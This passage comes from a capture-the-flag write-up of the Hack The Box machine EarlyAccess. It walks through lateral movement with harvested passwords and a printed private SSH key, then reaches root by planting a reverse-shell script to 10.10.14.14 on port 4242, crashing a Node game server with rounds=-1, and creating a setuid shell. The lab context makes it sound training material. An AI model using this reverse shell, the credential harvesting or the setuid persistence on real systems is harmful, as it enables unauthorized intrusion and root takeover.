On ```/home``` directory we can see the user ```www-adm```:
```console
www-data@webserver:/var/www/earlyaccess.htb$ ls /home
ls /home
www-adm

```

We can switch to this user using the admin password we found earlier ```gameover```:
```console
www-data@webserver:/var/www/earlyaccess.htb$ su www-adm
su www-adm
Password: gameover

www-adm@webserver:/var/www/earlyaccess.htb$ 

```

And we are log in as ```www-adm```.

### User 2 

On ```/home/www-adm``` we found hidden file with API credentials:
```console
www-adm@webserver:~$ cat .wgetrc
cat .wgetrc
user=api
password=s3CuR3_API_PW!
```

This file, [wgetrc](https://www.gnu.org/software/wget/manual/html_node/Wgetrc-Commands.html) contains credentials which used by ```wget```.

So It's meaning that we need to find API.

After enumerating we found a file ```/var/www/html/app/Models``` which contains the following API URL:
```php
...
            $response = Http::get('http://api:5000/verify/' . $key);
```

By access to this URL we get:
```console
www-adm@webserver:~$ wget http://api:5000/verify
wget http://api:5000/verify
--2021-12-21 22:54:22--  http://api:5000/verify
Resolving api (api)... 172.18.0.101
Connecting to api (api)|172.18.0.101|:5000... connected.
HTTP request sent, awaiting response... 404 NOT FOUND
2021-12-21 22:54:22 ERROR 404: NOT FOUND.
```

But if we access to [http://api:5000/](http://api:5000/) we get the following page:
```console
www-adm@webserver:~$ wget http://api:5000/      
wget http://api:5000/
--2021-12-21 22:54:26--  http://api:5000/
Resolving api (api)... 172.18.0.101
Connecting to api (api)|172.18.0.101|:5000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 254 [application/json]
Saving to: ‘index.html’

index.html          100%[===================>]     254  --.-KB/s    in 0s      

2021-12-21 22:54:26 (21.0 MB/s) - ‘index.html’ saved [254/254]
www-adm@webserver:~$ cat index.html
cat index.html
{"message":"Welcome to the game-key verification API! You can verify your keys via: /verify/<game-key>. If you are using manual verification, you have to synchronize the magic_num here. Admin users can verify the database using /check_db.","status":200}

```

So let's try to access to [http://api:5000/check_db](http://api:5000/check_db):
```console
www-adm@webserver:~$ wget http://api:5000/check_db
wget http://api:5000/check_db
--2021-12-21 22:56:06--  http://api:5000/check_db
Resolving api (api)... 172.18.0.101
Connecting to api (api)|172.18.0.101|:5000... connected.
HTTP request sent, awaiting response... 401 UNAUTHORIZED
Authentication selected: Basic
Connecting to api (api)|172.18.0.101|:5000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8711 (8.5K) [application/json]
Saving to: ‘check_db’

check_db            100%[===================>]   8.51K  --.-KB/s    in 0s      

2021-12-21 22:56:06 (211 MB/s) - ‘check_db’ saved [8711/8711]

www-adm@webserver:~$ cat check_db
cat check_db
{
  "message": {
    "AppArmorProfile": "docker-default",
    "Args": [
      "--character-set-server=utf8mb4",
      "--collation-server=utf8mb4_bin",
      "--skip-character-set-client-handshake",
      "--max_allowed_packet=50MB",
      "--general_log=0",
      "--sql_mode=ANSI_QUOTES,ERROR_FOR_DIVISION_BY_ZERO,IGNORE_SPACE,NO_ENGINE_SUBSTITUTION,NO_ZERO_DATE,NO_ZERO_IN_DATE,PIPES_AS_CONCAT,REAL_AS_FLOAT,STRICT_ALL_TABLES"
    ],
    "Config": {
      "AttachStderr": false,
      "AttachStdin": false,
      "AttachStdout": false,
      "Cmd": [
        "--character-set-server=utf8mb4",
        "--collation-server=utf8mb4_bin",
        "--skip-character-set-client-handshake",
        "--max_allowed_packet=50MB",
        "--general_log=0",
        "--sql_mode=ANSI_QUOTES,ERROR_FOR_DIVISION_BY_ZERO,IGNORE_SPACE,NO_ENGINE_SUBSTITUTION,NO_ZERO_DATE,NO_ZERO_IN_DATE,PIPES_AS_CONCAT,REAL_AS_FLOAT,STRICT_ALL_TABLES"
      ],
      "Domainname": "",
      "Entrypoint": [
        "docker-entrypoint.sh"
      ],
      "Env": [
        "MYSQL_DATABASE=db",
        "MYSQL_USER=drew",
        "MYSQL_PASSWORD=drew",
        "MYSQL_ROOT_PASSWORD=XeoNu86JTznxMCQuGHrGutF3Csq5",
        "SERVICE_TAGS=dev",
        "SERVICE_NAME=mysql",
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        "GOSU_VERSION=1.12",
        "MYSQL_MAJOR=8.0",
        "MYSQL_VERSION=8.0.25-1debian10"
      ],
      "ExposedPorts": {
        "3306/tcp": {
          
        },
        "33060/tcp": {
          
        }
      },
...
}
```  

And we can see the credentials of ```drew``` user which is ```XeoNu86JTznxMCQuGHrGutF3Csq5```, Let's use those credentials:
```console
┌─[evyatar@parrot]─[/hackthebox/EarlyAccess]
└──╼ $ ssh drew@earlyaccess.htb
drew@earlyaccess.htb's password: 
Linux earlyaccess 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Sun Sep  5 15:56:50 2021 from 10.10.14.14
drew@earlyaccess:~$ cat user.txt
9ccafafe80fb6733bd59b0203bbf2e9a
```

And we get the user flag ```9ccafafe80fb6733bd59b0203bbf2e9a```.

### Root

On ```/var/mail``` we found the following ```drew``` email:
```console
drew@earlyaccess:/var/mail$ cat drew 
To: <drew@earlyaccess.htb>
Subject: Game-server crash fixes
From: game-adm <game-adm@earlyaccess.htb>
Date: Thu May 27 8:10:34 2021


Hi Drew!

Thanks again for taking the time to test this very early version of our newest project!
We have received your feedback and implemented a healthcheck that will automatically restart the game-server if it has crashed (sorry for the current instability of the game! We are working on it...) 
If the game hangs now, the server will restart and be available again after about a minute.

If you find any other problems, please don't hesitate to report them!

Thank you for your efforts!
Game-adm (and the entire EarlyAccess Studios team).
```

We can see also on ```/home/drew/.ssh``` directory a private SSH key of ```game-tester@game-server```:
```console
drew@earlyaccess:~/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
drew@earlyaccess:~/.ssh$ cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDMYU1DjEX8HWBPFBxoN+JXFBJUZBPr+IFO5yI25HMkFSlQZLaJajtEHeoBsD1ldSi7Q0qHYvVhYh7euYhr85vqa3cwGqJqJH54Dr5WkNDbqrB5AfgOWkUIomV4QkfZSmKSmI2UolEjVf1pIYYsJY+glqzJLF4hQ8x4d2/vJj3CmWDJeA0AGH0+3sjpmpYyoY+a2sW0JAPCDvovO1aT7FOnYKj3Qyl7NDGwJkOoqzZ66EmU3J/1F0e5XNg74wK8dvpZOJMzHola1CS8NqRhUJ7RO2EEZ0ITzmuLmY9s2N4ZgQPlwUvhV5Aj9hqckV8p7IstrpdGsSbZEv4CR2brsEhwsspAJHH+350e3dCYMR4qDyitsLefk2ezaBRAxrXmZaeNeBCZrZmqQ2+Knak6JBhLge9meo2L2mE5IoPcjgH6JBbYOMD/D3pC+MAfxtNX2HhB6MR4Rdo7UoFUTbp6KIpVqtzEB+dV7WeqMwUrrZjs72qoGvO82OvGqJON5F/OhoHDao+zMJWxNhE4Zp4DBii39qhm2wC6xPvCZT0ZSmdCe3pB82Jbq8yccQD0XGtLgUFv1coaQkl/CU5oBymR99AXB/QnqP8aML7ufjPbzzIEGRfJVE2A3k4CQs4Zo+GAEq7WNy1vOJ5rZBucCUXuc2myZjHXDw77nvettGYr5lcS8w== game-tester@game-server

```

And by running [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) we can see the following IP's:
```console
...
╔══════════╣ Networks and neighbours
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         10.10.10.2      0.0.0.0         UG    0      0        0 ens160
10.10.10.0      0.0.0.0         255.255.254.0   U     0      0        0 ens160
172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 docker0
172.18.0.0      0.0.0.0         255.255.0.0     U     0      0        0 br-d11ba9f0187b
172.19.0.0      0.0.0.0         255.255.0.0     U     0      0        0 br-0885b5a3e9f0
IP address       HW type     Flags       HW address            Mask     Device
10.10.10.2       0x1         0x2         00:50:56:b9:80:a3     *        ens160
172.18.0.2       0x1         0x2         02:42:ac:12:00:02     *        br-d11ba9f0187b
172.19.0.3       0x1         0x2         02:42:ac:13:00:03     *        br-0885b5a3e9f0
172.18.0.102     0x1         0x2         02:42:ac:12:00:66     *        br-d11ba9f0187b

```

By trying the private SSH key we found the SSH key work with ```172.19.0.3``` IP which is another container:
```console
drew@earlyaccess:~/.ssh$ ssh game-tester@172.19.0.3
Linux game-server 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Dec 21 23:28:07 2021 from 172.19.0.1
game-tester@game-server:~$ 

```

By running again [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) we found the following script which running by ```root```:
```console
root          1  0.0  0.0  17948  2808 ?        Ss   21:43   0:00 /bin/bash /entrypoint.sh
```

The script contains:
```console
game-tester@game-server:/$ cat entrypoint.sh 
#!/bin/bash
for ep in /docker-entrypoint.d/*; do
if [ -x "${ep}" ]; then
    echo "Running: ${ep}"
    "${ep}" &
  fi
done
tail -f /dev/null
```

So if we create a script on ```/docker-entrypoint.d``` it will be running by ```root```.

By running ```df -h``` we can see this path mounted:
```console
game-tester@game-server:/$ df -h
Filesystem      Size  Used Avail Use% Mounted on
overlay         8.9G  6.5G  1.9G  78% /
tmpfs            64M     0   64M   0% /dev
tmpfs           2.0G     0  2.0G   0% /sys/fs/cgroup
shm              64M     0   64M   0% /dev/shm
/dev/sda1       8.9G  6.5G  1.9G  78% /docker-entrypoint.d
```

We don't have write permission to this path but we can use ```drew``` user to create a script on this path:
```console
drew@earlyaccess:/opt/docker-entrypoint.d$ nano test.sh
drew@earlyaccess:/opt/docker-entrypoint.d$ chmod 777 test.sh
drew@earlyaccess:/opt/docker-entrypoint.d$ ls
node-server.sh  test.sh
drew@earlyaccess:/opt/docker-entrypoint.d$ cat test.sh 
bash -i >& /dev/tcp/10.10.16.4/4242 0>&1
```

We can see also on ```game-tester``` shell port ```9999``` is open:
```console
game-tester@game-server:/tmp$ ./netstat -ant
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:9999            0.0.0.0:*               LISTEN     
...
```

Where the webserver code is:
```node
game-tester@game-server:/usr/src/app$ cat server.js 
'use strict';

var express = require('express');
var ip = require('ip');

const PORT = 9999;
var rounds = 3;

// App
var app = express();
app.set('view engine', 'ejs');
app.use(express.urlencoded({ extended: true }));

/**
 * https://stackoverflow.com/a/1527820
 * 
 * Returns a random integer between min (inclusive) and max (inclusive).
 * The value is no lower than min (or the next integer greater than min
 * if min isn't an integer) and no greater than max (or the next integer
 * lower than max if max isn't an integer).
 * Using Math.round() will give you a non-uniform distribution!
 */
function random(min, max) {
  min = Math.ceil(min);
  max = Math.floor(max);
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

/**
 * https://stackoverflow.com/a/11377331
 * 
 * Returns result of game (randomly determined)
 * 
 */
function play(player = -1)
{
  // Random numbers to determine win
  if (player == -1)
    player = random(1, 3);
  var computer = random(1, 3);
  
  if (player == computer) return 'tie';
  else if ((player - computer + 3) % 3 == 1) return 'win';
  else return 'loss';
}

app.get('/', (req, res) => {
  res.render('index');
});

app.get('/autoplay', (req,res) => {
  res.render('autoplay');
});

app.get('/rock', (req,res) => {
  res.render('index', {result:play(1)});
});

app.get('/paper', (req,res) => {
  res.render('index', {result:play(2)});
});

app.get('/scissors', (req,res) => {
  res.render('index', {result:play(3)});
});

app.post('/autoplay', async function autoplay(req,res) {
  
  // Stop execution if not number
  if (isNaN(req.body.rounds))
  {
    res.sendStatus(500);
    return;
  }
  // Stop execution if too many rounds are specified (performance issues may occur otherwise)
  if (req.body.rounds > 100)
  {
    res.sendStatus(500);
    return;
  }

  rounds = req.body.rounds;

  res.write('<html><body>')
  res.write('<h1>Starting autoplay with ' + rounds + ' rounds</h1>');
  
  var counter = 0;
  var rounds_ = rounds;
  var wins = 0;
  var losses = 0;
  var ties = 0;

  while(rounds != 0)
  {
    counter++;
    var result = play();
    if(req.body.verbose)
    {
      res.write('<p><h3>Playing round: ' + counter + '</h3>\n');
      res.write('Outcome of round: ' + result + '</p>\n');
    }
    if (result == "win")
      wins++;
    else if(result == "loss")
      losses++;
    else
      ties++;
      
    // Decrease round
    rounds = rounds - 1;
  }
  rounds = rounds_;

  res.write('<h4>Stats:</h4>')
  res.write('<p>Wins: ' + wins + '</p>')
  res.write('<p>Losses: ' + losses + '</p>')
  res.write('<p>Ties: ' + ties + '</p>')
  res.write('<a href="/autoplay">Go back</a></body></html>')
  res.end()
});

app.listen(PORT, "0.0.0.0");
console.log(`Running on http://${ip.address()}:${PORT}`);
```

And we can see also the file ```/entrypoint.sh``` which contains:
```bash
game-tester@game-server:~$ cat /entrypoint.sh 
#!/bin/bash
for ep in /docker-entrypoint.d/*; do
if [ -x "${ep}" ]; then
    echo "Running: ${ep}"
    "${ep}" &
  fi
done
tail -f /dev/null
```

So It's meaning that when the game server runs again it will run the scripts on ```/docker-entrypoint.d/``` directory as ```root```.

We have access to write to this folder from ```drew``` shell, So actually we need to crash the game, We can simply do it by sending ```rounds=-1```.

First, Let's create a reverse shell script on ```/opt/docker-entrypoint.d```:
```console
drew@earlyaccess:/opt/docker-entrypoint.d$ cat shell.sh
bash -i >& /dev/tcp/10.10.14.14/4242 0>&1
```

Next, Let's listen to port ```4242``` using ```nc```:
```console
┌─[evyatar@parrot]─[/hackthebox/EarlyAccess]
└──╼ $ nc -lvp 4242
listening on [any] 4242 ...
```
Next, Let's send the CURL request to crash the game-server:
```console
ssh -i ~/.ssh/id_rsa game-tester@172.19.0.3 'curl -X POST -d "rounds=-1" http://127.0.0.1:9999/autoplay' 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100     9    0     0    0     9      0      0 --:--:--  0:00:21 --:--:--     0Connection to 172.19.0.3 closed by remote host.
```

And we get ```root``` shell on ```game-server```:
```console
connect to [10.10.16.4] from earlyaccess.htb [10.10.11.110] 36382
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@game-server:/# id && whoami && hostname
id && whoami && hostname
uid=0(root) gid=0(root) groups=0(root)
root
game-server
```

Now we can run commands as ```root```, We can copy ```/bin/sh``` to the mount directory ```/docker-entrypoint``` and give to this file ```u+s``` permission and then we can run it from ```drew``` shell as ```root```:
```console
root@game-server:/docker-entrypoint.d# cp /bin/sh /docker-entrypoint.d/ && chmod u+s /docker-entrypoint.d/sh
```

Now we can see this file on ```drew``` session:
```console
drew@earlyaccess:/opt/docker-entrypoint.d$ ls -ltr
total 120
-rwxr-xr-x 1 root root    100 Dec 22 23:39 node-server.sh
-rwsr-xr-x 1 root root 117208 Dec 22 23:39 sh

```

So let's just run it:
```console
drew@earlyaccess:/opt/docker-entrypoint.d$ ls -ltr
total 120
-rwxr-xr-x 1 root root    100 Dec 22 23:39 node-server.sh
-rwsr-xr-x 1 root root 117208 Dec 22 23:39 sh
rew@earlyaccess:/opt/docker-entrypoint.d$ ./sh
# id && whoami && hostname
uid=1000(drew) gid=1000(drew) euid=0(root) groups=1000(drew)
root
earlyaccess
# cat /root/root.txt
62e86bb981e840bb8a31d3b1e9fe7a0a
```

And we get the root flag ```62e86bb981e840bb8a31d3b1e9fe7a0a```.